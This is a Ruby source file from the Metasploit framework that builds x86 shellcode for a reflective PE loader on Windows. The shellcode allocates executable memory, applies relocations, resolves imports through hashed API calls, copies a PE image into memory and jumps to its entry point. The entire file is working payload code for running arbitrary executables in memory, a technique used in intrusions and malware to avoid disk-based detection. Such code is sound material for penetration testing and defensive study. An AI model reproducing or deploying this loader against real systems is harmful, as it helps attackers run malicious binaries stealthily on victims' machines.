# -*- coding: binary -*-

module Msf
  module Payload::Windows::ReflectivePELoader
    include Payload::Windows::BlockApi
    def asm_reflective_pe_loader(opts)

      prologue = ''
      if opts[:is_dll] == true
        prologue = %(
  push edi                ; AOE
  sub [esp],eax           ; hinstDLL
  push 0x01               ; fdwReason
  push 0x00               ; lpReserved
)
      end

      %^
stub:
  cld                     ; Clear direction flags
  pop esi                 ; Get the address of image to esi
  call $+5                ; Push the current EIP to stack
  sub [esp],esi           ; Subtract &PE from EIP and get image_size
  call start              ; Push the address of API to stack
  #{asm_block_api}
start:                    ;
  pop ebp                 ; Get the address of api to ebp
  mov eax,[esi+0x3C]      ; Get the offset of "PE" to eax
  mov ebx,[eax+esi+0x34]  ; Get the image base address to ebx
  mov eax,[eax+esi+0x28]  ; Get the address of entry point to eax
  push eax                ; Save the address of entry to stack
  push 0x40               ; PAGE_EXECUTE_READ_WRITE
  push 0x103000           ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
  push dword [esp+12]     ; dwSize
  push 0x00               ; lpAddress
  push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
  call ebp                ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  push eax                ; Save the new image base to stack
  xor edx,edx             ; Zero out the edx
relocate:
  mov eax,[esi+0x3C]      ; Offset to IMAGE_NT_HEADER ("PE")
  mov ecx,[eax+esi+0xA4]  ; Base relocation table size
  mov eax,[eax+esi+0xA0]  ; Base relocation table RVA
  add eax,esi             ; Base relocation table memory address
  add ecx,eax             ; End of base relocation table
calc_delta:
  mov edi,[esp]           ; Move the new base address to EDI
  sub edi,ebx             ; Delta value
  push dword [eax]        ; Reloc RVA
  push dword [eax+4]      ; Reloc table size
  add eax,0x08            ; Move to the reloc descriptor
  jmp fix                 ; Start fixing
get_rva:
  cmp ecx,eax             ; Check if the end of the reloc section ?
  jle reloc_fin           ; If yes goto fin
  add esp,0x08            ; Deallocate old reloc RVA and reloc table size variables
  push dword [eax]        ; Push new reloc RVA
  push dword [eax+4]      ; Push new reloc table size
  add eax,0x08            ; Move 8 bytes
fix:
  cmp word [esp],0x08     ; Check if the end of the reloc block
  jz get_rva              ; If yes set the next block RVA
  mov dx,word [eax]       ; Move the reloc desc to dx
  cmp dx, 0x00            ; Check if it is a padding word
  je pass
  and dx,0x0FFF           ; Get the last 12 bits
  add edx,[esp+4]         ; Add block RVA to desc value
  add edx,esi             ; Add the start address of the image
  add dword [edx],edi     ; Add the delta value to calculated absolute address
pass:
  sub dword [esp],0x02    ; Decrease the index
  add eax,0x02            ; Move to the next reloc desc.
  xor edx,edx             ; Zero out edx
  jmp fix                 ; Loop
reloc_fin:
  pop eax                 ; Deallocate all vars
  pop eax                 ; ...
  mov eax,[esi+0x3C]      ; Offset to IMAGE_NT_HEADER ("PE")
  mov eax,[eax+esi+0x80]  ; Import table RVA
  add eax,esi             ; Import table memory address (first image import descriptor)
  push eax                ; Save the address of import descriptor to stack
get_modules:
  cmp dword [eax],0x00    ; Check if the import names table RVA is NULL
  jz complete             ; If yes building process is done
  mov eax,[eax+0x0C]      ; Get RVA of dll name to eax
  add eax,esi             ; Get the dll name address
  call LoadLibraryA       ; Load the library
  mov ebx,eax             ; Move the dll handle to ebx
  mov eax,[esp]           ; Move the address of current _IMPORT_DESCRIPTOR to eax
  call get_procs          ; Resolve all windows API function addresses
  add dword [esp],0x14    ; Move to the next import descriptor
  mov eax,[esp]           ; Set the new import descriptor address to eax
  jmp get_modules
get_procs:
  push ecx                ; Save ecx to stack
  push dword [eax+0x10]   ; Save the current import descriptor IAT RVA
  add [esp],esi           ; Get the IAT memory address
  mov eax,[eax]           ; Set the import names table RVA to eax
  add eax,esi             ; Get the current import descriptor's import names table address
  push eax                ; Save it to stack
resolve:
  cmp dword [eax],0x00    ; Check if end of the import names table
  jz all_resolved         ; If yes resolving process is done
  mov eax,[eax]           ; Get the RVA of function hint to eax
  cmp eax,0x80000000      ; Check if the high order bit is set
  js name_resolve         ; If high order bit is not set resolve with INT entry
  sub eax,0x80000000      ; Zero out the high bit
  call GetProcAddress     ; Get the API address with hint
  jmp insert_iat          ; Insert the address of API tı IAT
name_resolve:
  add eax,esi             ; Set the address of function hint
  add eax,0x02            ; Move to function name
  call GetProcAddress     ; Get the function address to eax
insert_iat:
  mov ecx,[esp+4]         ; Move the IAT address to ecx
  mov [ecx],eax           ; Insert the function address to IAT
  add dword [esp],0x04    ; Increase the import names table index
  add dword [esp+4],0x04  ; Increase the IAT index
  mov eax,[esp]           ; Set the address of import names table address to eax
  jmp resolve             ; Loop
all_resolved:
  mov ecx,[esp+4]         ; Move the IAT address to ecx
  mov dword [ecx],0x00    ; Insert a NULL dword
  pop ecx                 ; Deallocate index values
  pop ecx                 ; ...
  pop ecx                 ; Put back the ecx value
  ret                     ; <-
LoadLibraryA:
  push ecx                ; Save ecx to stack
  push edx                ; Save edx to stack
  push eax                ; Push the address of linrary name string
  push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}         ; ror13( "kernel32.dll", "LoadLibraryA" )
  call ebp                ; LoadLibraryA([esp+4])
  pop edx                 ; Retreive edx
  pop ecx                 ; Retreive ecx
  ret                     ; <-
GetProcAddress:
  push ecx                ; Save ecx to stack
  push edx                ; Save edx to stack
  push eax                ; Push the address of proc name string
  push ebx                ; Push the dll handle
  push #{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}         ; ror13( "kernel32.dll", "GetProcAddress" )
  call ebp                ; GetProcAddress(ebx,[esp+4])
  pop edx                 ; Retrieve edx
  pop ecx                 ; Retrieve ecx
  ret                     ; <-
complete:
  pop eax                 ; Clean out the stack
  pop edi                 ; ..
  mov edx,edi             ; Copy the address of new base to EDX
  pop eax                 ; Pop the address_of_entry to EAX
  add edi,eax             ; Add the address of entry to new image base
  pop ecx                 ; Pop the image_size to ECX
memcpy:
  mov al,[esi]            ; Move 1 byte of PE image to AL register
  mov [edx],al            ; Move 1 byte of PE image to image base
  inc esi                 ; Increase PE image index
  inc edx                 ; Increase image base index
  loop memcpy             ; Loop until ECX = 0
PE_Start:
  #{prologue}
  call edi                ; Call PE AOE
  push 0x00               ; dwExitCode
  push #{'0x%.8x' % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
  call api_call           ; Call the exit funk based on exit_type
      ^
    end
  end
end
